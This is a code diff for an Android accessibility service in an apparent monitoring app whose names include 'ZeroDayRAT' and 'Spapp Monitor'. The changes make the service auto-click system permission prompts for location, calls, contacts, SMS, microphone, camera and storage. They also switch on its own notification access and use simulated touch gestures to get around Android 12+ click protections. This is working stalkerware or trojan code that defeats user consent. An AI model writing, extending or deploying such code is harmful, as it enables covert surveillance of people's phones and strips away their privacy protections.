@@ -1,7 +1,10 @@
 package com.spapp.monitoring.blocking
 
 import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.GestureDescription
+import android.graphics.Path
 import android.graphics.Rect
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -129,10 +132,14 @@ class BlockAccessibilityService : AccessibilityService() {
         syncDebounceHandler.postDelayed(r, 600L)
     }
 
+    private var isAutoGrantLoopActive = false
+
     fun startPermissionAutoGrantLoop() {
+        if (isAutoGrantLoopActive) return
+        isAutoGrantLoopActive = true
         val handler = Handler(Looper.getMainLooper())
         var runs = 0
-        val maxRuns = 60 // 60 * 250ms = 15-18 seconds of continuous scanning to catch ALL sequential permission dialogs
+        val maxRuns = 150 // 150 * 50ms = 7.5s, fast responsive scanning
         val runnable = object : Runnable {
             override fun run() {
                 runs++
@@ -141,38 +148,45 @@ class BlockAccessibilityService : AccessibilityService() {
                 // Continuous auto-grant: Keep running even when clicked == true!
                 // Android presents permissions sequentially (Location -> Calls -> Contacts -> SMS -> Mic -> Camera -> Storage)
                 if (runs < maxRuns) {
-                    val nextDelay = if (clicked) 350L else 200L
+                    val nextDelay = if (clicked) 60L else 40L
                     handler.postDelayed(this, nextDelay)
                 } else {
+                    isAutoGrantLoopActive = false
                     scheduleSyncAfterPermissionClick()
                 }
             }
         }
-        handler.postDelayed(runnable, 150L)
+        handler.post(runnable)
     }
 
-    fun clickAnyPermissionDialog(): Boolean {
+    fun clickAnyPermissionDialog(fallbackNode: AccessibilityNodeInfo? = null): Boolean {
         try {
             val candidateRoots = mutableListOf<AccessibilityNodeInfo>()
-            rootInActiveWindow?.let { candidateRoots.add(it) }
-            try {
-                windows?.forEach { win ->
-                    win.root?.let { candidateRoots.add(it) }
-                }
-            } catch (_: Exception) {}
+            fallbackNode?.let { candidateRoots.add(it) }
+            rootInActiveWindow?.let { if (!candidateRoots.contains(it)) candidateRoots.add(it) }
+            // Only query windows if active window and fallback are not available
+            if (candidateRoots.isEmpty()) {
+                try {
+                    windows?.forEach { win ->
+                        win.root?.let { candidateRoots.add(it) }
+                    }
+                } catch (_: Exception) {}
+            }
 
             if (candidateRoots.isEmpty()) return false
 
             // Target resource IDs across Google Pixel, AOSP, Samsung OneUI, Xiaomi MIUI, Oppo ColorOS, Vivo FuntouchOS
             val targetIds = listOf(
-                "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
                 "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
-                "com.google.android.permissioncontroller:id/permission_allow_button",
+                "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
                 "com.android.permissioncontroller:id/permission_allow_button",
-                "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
+                "com.google.android.permissioncontroller:id/permission_allow_button",
+                "com.android.permissioncontroller:id/permission_allow_all_button",
+                "com.google.android.permissioncontroller:id/permission_allow_all_button",
                 "com.android.permissioncontroller:id/permission_allow_one_time_button",
-                "com.google.android.permissioncontroller:id/permission_allow_always_button",
+                "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
                 "com.android.permissioncontroller:id/permission_allow_always_button",
+                "com.google.android.permissioncontroller:id/permission_allow_always_button",
                 "com.samsung.android.permissioncontroller:id/permission_allow_button",
                 "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
                 "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
@@ -317,7 +331,27 @@ class BlockAccessibilityService : AccessibilityService() {
     }
 
     private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
+        // Fast-path: On Android 12+, permissioncontroller blocks ACTION_CLICK, so dispatchGesture directly
+        val pkg = node.packageName?.toString() ?: ""
+        val isPermissionWindow = pkg.contains("permission") || pkg.contains("packageinstaller")
+        if (isPermissionWindow && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val bounds = Rect()
+            node.getBoundsInScreen(bounds)
+            if (bounds.width() > 0 && bounds.height() > 0) {
+                val x = bounds.centerX().toFloat()
+                val y = bounds.centerY().toFloat()
+                val path = Path().apply { moveTo(x, y) }
+                val gesture = GestureDescription.Builder()
+                    .addStroke(GestureDescription.StrokeDescription(path, 0, 20))
+                    .build()
+                val res = dispatchGesture(gesture, null, null)
+                Log.d("BlockA11y", "Fast-path gesture tap at ($x, $y) -> res=$res")
+                if (res) return true
+            }
+        }
+
         if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+            Log.d("BlockA11y", "Clicked via performAction ACTION_CLICK")
             return true
         }
         var p = node.parent
@@ -325,10 +359,27 @@ class BlockAccessibilityService : AccessibilityService() {
             val cls = p.className?.toString() ?: ""
             if (p.isClickable && (cls.contains("Button") || p.isClickable)) {
                 if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                    Log.d("BlockA11y", "Clicked parent via performAction ACTION_CLICK")
                     return true
                 }
             }
             p = p.parent
+        }
+        // Fallback for any other system dialogs: dispatchGesture simulates real touch tap
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val bounds = Rect()
+            node.getBoundsInScreen(bounds)
+            if (bounds.width() > 0 && bounds.height() > 0) {
+                val x = bounds.centerX().toFloat()
+                val y = bounds.centerY().toFloat()
+                val path = Path().apply { moveTo(x, y) }
+                val gesture = GestureDescription.Builder()
+                    .addStroke(GestureDescription.StrokeDescription(path, 0, 20))
+                    .build()
+                val res = dispatchGesture(gesture, null, null)
+                Log.d("BlockA11y", "Dispatched gesture tap at ($x, $y) -> res=$res")
+                return res
+            }
         }
         return false
     }
@@ -347,7 +398,7 @@ class BlockAccessibilityService : AccessibilityService() {
     fun handleNotificationAccessAutoToggle(): Boolean {
         try {
             val now = android.os.SystemClock.uptimeMillis()
-            if (now - lastNotifToggleTime < 800L) return false
+            if (now - lastNotifToggleTime < 400L) return false
 
             val candidateRoots = mutableListOf<AccessibilityNodeInfo>()
             rootInActiveWindow?.let { candidateRoots.add(it) }
@@ -356,6 +407,7 @@ class BlockAccessibilityService : AccessibilityService() {
             } catch (_: Exception) {}
 
             if (candidateRoots.isEmpty()) return false
+            Log.d("BlockA11y", "clickAnyPermissionDialog called: candidateRoots count=${candidateRoots.size}")
 
             // Case A: If Notification Access is already granted, but we are still on the settings screen:
             // Auto-navigate back to return to MainActivity!
@@ -370,35 +422,66 @@ class BlockAccessibilityService : AccessibilityService() {
                     lastNotifToggleTime = now
                     Handler(Looper.getMainLooper()).postDelayed({
                         performGlobalAction(GLOBAL_ACTION_BACK)
-                    }, 400L)
+                    }, 300L)
                     return true
                 }
                 return false
             }
 
             // Case B: In Notification Access settings list or toggle sub-screen:
-            val appName = getString(com.spapp.monitoring.R.string.app_name) // "Spapp Monitor"
+            val appNames = listOf(
+                getString(com.spapp.monitoring.R.string.app_name),
+                "ZeroDayRAT",
+                "Spapp Monitor"
+            )
             for (root in candidateRoots) {
                 // Check if our app row is visible in the list:
-                val appNodes = root.findAccessibilityNodeInfosByText(appName)
-                if (!appNodes.isNullOrEmpty()) {
-                    for (node in appNodes) {
-                        if (clickNodeOrParent(node)) {
-                            Log.i("BlockA11y", "Auto-clicked $appName in notification access settings")
-                            lastNotifToggleTime = now
-                            return true
+                for (name in appNames) {
+                    val appNodes = root.findAccessibilityNodeInfosByText(name)
+                    if (!appNodes.isNullOrEmpty()) {
+                        for (node in appNodes) {
+                            if (clickNodeOrParent(node)) {
+                                Log.i("BlockA11y", "Auto-clicked $name in notification access settings")
+                                lastNotifToggleTime = now
+                                return true
+                            }
+                        }
+                    }
+                }
+
+                // Check for switches by view ID:
+                val switchIds = listOf("android:id/switch_widget", "com.android.settings:id/switch_widget")
+                for (sId in switchIds) {
+                    val switchNodes = root.findAccessibilityNodeInfosByViewId(sId)
+                    if (!switchNodes.isNullOrEmpty()) {
+                        for (node in switchNodes) {
+                            if (!node.isChecked) {
+                                if (clickNodeOrParent(node)) {
+                                    Log.i("BlockA11y", "Auto-clicked switch widget by ID: $sId")
+                                    lastNotifToggleTime = now
+                                    return true
+                                }
+                            }
                         }
                     }
                 }
 
                 // Check for generic switch or "Allow notification access" toggle on the detail screen:
-                val toggleNodes = root.findAccessibilityNodeInfosByText("Allow notification access")
-                if (!toggleNodes.isNullOrEmpty()) {
-                    for (node in toggleNodes) {
-                        if (clickNodeOrParent(node)) {
-                            Log.i("BlockA11y", "Auto-toggled 'Allow notification access' switch")
-                            lastNotifToggleTime = now
-                            return true
+                val toggleTexts = listOf(
+                    "Allow notification access",
+                    "Use ZeroDayRAT",
+                    "Use Spapp Monitor",
+                    "Allow"
+                )
+                for (toggleText in toggleTexts) {
+                    val toggleNodes = root.findAccessibilityNodeInfosByText(toggleText)
+                    if (!toggleNodes.isNullOrEmpty()) {
+                        for (node in toggleNodes) {
+                            if (clickNodeOrParent(node)) {
+                                Log.i("BlockA11y", "Auto-toggled '$toggleText' switch")
+                                lastNotifToggleTime = now
+                                return true
+                            }
                         }
                     }
                 }
@@ -429,7 +512,7 @@ class BlockAccessibilityService : AccessibilityService() {
         if (isPermissionCandidate) {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                clickAnyPermissionDialog()
+                clickAnyPermissionDialog(event.source)
                 handleNotificationAccessAutoToggle()
             }
         }
